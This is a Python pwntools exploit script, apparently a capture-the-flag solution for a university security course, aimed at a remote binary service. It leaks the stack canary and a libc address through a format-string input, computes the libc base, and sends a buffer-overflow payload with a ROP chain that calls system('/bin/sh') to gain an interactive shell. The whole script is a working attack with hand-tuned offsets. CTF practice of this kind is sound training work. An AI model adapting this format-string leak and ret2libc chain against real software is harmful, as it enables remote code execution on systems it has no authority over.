from pwn import *

elf = ELF("program")
LOCAL = False

if LOCAL:
   libc = elf.libc
   p = elf.process()
else:
   libc = ELF("libc.so.6")
   p = remote("ctf-fsi.fe.up.pt", 4002)

ropExec = ROP(elf)

def message(p, sms):
   p.recvuntil(b">")
   p.sendline(b"e")
   p.recvuntil(b"Insert your name (max 20 chars): ")
   p.sendline(sms)
   ans = p.recvline()
   p.recvuntil(b"Insert your message: ")
   p.sendline(b"")
   return ans

buffOffset = 20

sms1 = message(p, b"%8$x.%11$x")
print(int(sms1.split(b'.')[0], 16))
canary, putsAddress = [int(val,16) for val in sms1.split(b'.')]

print("KKKKKK", canary, putsAddress, libc.symbols["__libc_start_main"], libc.symbols["system"], next(libc.search(b"/bin/sh")))

for key, value in libc.symbols.items():
	if libc.symbols["__libc_start_main"] + 71 == value:
	  print(key)

libc.address = putsAddress - libc.symbols["__libc_start_main"] + 71 # offset para base

# Execute system
ropLib = ROP(libc)
ropLib.system(next(libc.search(b"/bin/sh")))
ropLib.exit()

# Canário termina com /0 ?? No problemo
payload = flat(b"a" * buffOffset,canary + 2, b"A"*8, ropLib.chain())

# payload = flat(b"a" * buffOffset,canary + 1, b"A"*8, libc.symbols["system"], b"A"*4, next(libc.search(b"/bin/sh")))

res = message(p, payload)

r = message(p, b"." * 19)

p.interactive()

